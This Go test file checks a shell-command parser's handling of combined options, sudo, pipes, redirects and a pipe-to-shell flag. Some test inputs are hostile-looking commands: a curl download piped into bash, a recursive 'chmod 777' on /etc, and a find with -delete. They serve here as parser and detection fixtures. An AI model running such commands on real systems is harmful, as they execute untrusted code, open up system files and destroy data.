package manx

import "testing"

func TestCombinedShortOptions(t *testing.T) {
	seg := Parse("tar -xzf f.tar.gz").Segments[0]
	if seg.Command != "tar" {
		t.Fatalf("command = %q", seg.Command)
	}
	for _, opt := range []string{"-x", "-z", "-f"} {
		if !seg.HasOption(opt) {
			t.Fatalf("missing option %s in %#v", opt, seg.Options)
		}
	}
	if !contains(seg.RawOptions, "-xzf") {
		t.Fatalf("raw options = %#v", seg.RawOptions)
	}
}

func TestLongSingleDashPreserved(t *testing.T) {
	seg := Parse("find . -name '*.log' -delete").Segments[0]
	if !contains(seg.RawOptions, "-name") || !contains(seg.RawOptions, "-delete") {
		t.Fatalf("raw options = %#v", seg.RawOptions)
	}
	if !contains(seg.Operands, ".") {
		t.Fatalf("operands = %#v", seg.Operands)
	}
}

func TestSudoDetection(t *testing.T) {
	seg := Parse("sudo chmod -R 777 /etc").Segments[0]
	if !seg.Sudo || seg.Command != "chmod" {
		t.Fatalf("sudo=%v command=%q", seg.Sudo, seg.Command)
	}
}

func TestPipeSplit(t *testing.T) {
	pc := Parse("ps aux | grep nginx")
	if !pc.HasPipe {
		t.Fatal("expected pipe")
	}
	got := pc.Commands()
	if len(got) != 2 || got[0] != "ps" || got[1] != "grep" {
		t.Fatalf("commands = %#v", got)
	}
}

func TestPipeToShellFlag(t *testing.T) {
	if !Parse("curl https://x.com/i.sh | bash").PipeToShell {
		t.Fatal("expected pipe-to-shell")
	}
}

func TestLongOptionWithValue(t *testing.T) {
	seg := Parse("grep --color=auto error f").Segments[0]
	if !seg.HasOption("--color") {
		t.Fatalf("options = %#v", seg.Options)
	}
}

func TestRedirect(t *testing.T) {
	seg := Parse("echo hi > out.txt").Segments[0]
	if !contains(seg.Redirects, "out.txt") {
		t.Fatalf("redirects = %#v", seg.Redirects)
	}
}
